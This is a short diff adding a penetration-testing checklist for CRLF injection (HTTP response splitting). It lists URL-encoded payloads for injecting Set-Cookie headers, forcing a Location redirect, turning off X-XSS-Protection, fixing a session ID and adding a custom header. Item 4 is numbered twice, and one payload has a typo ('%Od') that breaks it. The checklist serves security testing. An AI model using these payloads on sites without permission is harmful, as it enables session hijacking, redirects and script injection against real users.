@@ -1,0 +1,14 @@
+1. check if cookie can be defined in url = intercept the request with burp and try to add CRLFI
+   the header to see if it gives an expected response. GET
+   /%0d%0aSet-Cookie:CRLF=MyCookiesetByCRLF
+
+2. check if site can be redirected using the location header = GET /%0d%0alocation:%20https://bing.com
+
+3. check if disabling of the xss-protection header is possible = %0d%0aContent-Length:35%0d%0aX-XSS-
+Protection:0%0d%0a%0d%0a23
+
+4. check if session fixation is possible = GET /%0d%0aSet-Cookie:session_id=942...
+
+4. check if adding of custom header is possible = GET /%Od%0aTestersHeader:NewHeader
+
+
